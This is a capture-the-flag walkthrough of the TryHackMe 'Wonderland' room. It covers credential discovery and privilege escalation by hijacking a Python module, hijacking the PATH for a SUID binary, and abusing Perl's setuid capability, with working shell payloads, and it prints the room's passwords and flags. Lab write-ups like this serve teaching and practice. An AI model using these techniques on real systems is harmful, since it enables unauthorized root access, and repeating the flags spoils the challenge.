# Wonderland

[Link to the room](https://tryhackme.com/room/wonderland)

## Looking around the rabbit hole

After getting into http://10.10.176.220/r/a/b/b/i/t/ and inspecting the page i found a hidden p tag with this in it:

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

Maybe ssh password (?)

## SSH access


### alice

Well looks like it is. I could get access to the machine through ssh using the above credentials yeah!

Ok in `/home/alice` directory i found `root.txt` and `walrus_and_the_carpenter.py`. That last python file can be executed as the user `rabbit`. It just print random lines of a poem.

```
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The file have the next line `import random` which is a relative path so... i think we can work with that. I just wrote a little fake `random.py` file with the next content:


```
import pty

def choice(something_about_a_poem):
        pty.spawn("/bin/bash")
        exit()
```

Executing `walrus_and_the_carpenter.py` now as `sudo -l` showed, will execute our fake random module and give us access to `rabbit` user:

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ 
```

### rabbit

I like to run `HOME=/home/$USER` to have the right user home directory configured in the shell.

Looks like `rabbit` has access to a SUID executable: `teaParty`. It ask you for something nice but just core dump for some reason.

I decided to download the file to my machine so i just passed the file to `alice` and download it. It is not stripped so that is cool for looking inside hehe

Ok this is funny:

```
void main(void)

{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```

First the program just print the core dumped error, lmao. Second, it set the uid to 1003 (probably the `hatter` user).

I can see that the program uses the command `date` inside the `system` function with a relative PATH. Adding `/home/rabbit` to `rabbit` PATH: `PATH="$HOME:$PATH"` and creating `date` script in it with something... funny in it will do i think. (Remember to execute `chmod a+x date` to allow the system to run the script)

Lets try it, this is my `date` script:

```
#! /bin/sh

bash -p
```

And...

```
rabbit@wonderland:~$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:~$
```

Nice!

### hatter

I found a `passwd.txt` in `hatter` home directory. It contain `WhyIsARavenLikeAWritingDesk?` that is hatter password so we got to a "checkpoint":

`hatter:WhyIsARavenLikeAWritingDesk?`

We can now conect to hatter account directly.

Looks like the user flag is not here neither. Alice had the `root.txt` file in her directory, could be possible that we can just read `/root/user.txt` or something? In wonderland the things are a bit weird so lets try i dont know:

```
hatter@wonderland:~$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
```

So.. we got the user flag, nice (Totally on porpouse) lets go for the root one.

After i while i decided to execute `linpeas` and i saw something interesting:

```
Files with capabilities:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Perl can manipulate the process UID so... lets try something:

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'
root@wonderland:~# 
```

Jackpot! We are root, lets get that root flag with `cat /home/alice/root.txt`:

`thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`
